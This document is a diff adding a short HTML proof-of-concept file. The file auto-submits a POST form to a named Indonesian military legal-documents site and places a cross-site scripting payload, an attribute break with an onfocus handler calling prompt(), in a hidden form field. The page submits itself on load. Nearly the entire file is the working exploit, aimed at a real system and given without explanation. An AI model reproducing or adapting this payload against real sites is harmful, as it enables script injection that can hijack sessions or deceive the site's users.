@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<body>
+<form method="POST" action="https://jdih.tni.mil.id/rph">
+  <input type="hidden" name="perihal" value="xss"/>
+  <input type="hidden" name="nomor" value="&quot;autofocus%20onfocus=prompt()//"/>
+  <input type="hidden" name="tahun" value="21312"/>
+  <input type="hidden" name="jenis" value="76"/>
+  <input type="submit" value="Submit">
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+</body>
+</html>
